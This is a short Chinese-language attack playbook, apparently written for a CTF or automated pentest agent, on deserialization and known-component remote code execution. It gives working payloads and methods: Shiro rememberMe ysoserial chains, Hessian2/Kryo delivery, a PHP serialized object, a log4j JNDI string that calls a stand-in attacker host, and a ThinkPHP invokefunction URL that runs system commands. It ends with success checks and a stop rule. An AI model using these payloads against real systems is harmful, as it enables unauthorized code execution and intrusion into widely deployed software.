# deser 反序列化 / 已知组件 RCE

适用：cookie/POST 参数是 base64 大块（开头 rO0AB=Java / O:8="PHP；组件指纹（ThinkPHP、Shiro、Jackson、Fastjson、log4j）。

打法：
- Shiro rememberMe=rO0AB... → yso CommonsBeanutils/CB 链（有回显用 CommonsBeanutils1）。
- Java 服务 7777/8080 端口收二进制 → 结合 gopher/接口发 Hessian2/Kryo payload。
- PHP：O:8:"User":1:{s:4:"name";s:5:"admin";} 构造后 base64。
- log4j：${jndi:ldap://ATTACKER:PORT/x} 需外带；靶标内网不通时试 ${jndi:rmi://127.0.0.1:1099/x} 本地。
- ThinkPHP：/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

判定：uid=/flag{ 回显或 DNS 外带命中 → fact(kind=rce)。

停止：组件指纹不存在且 payload 全无差异响应，标 dead。
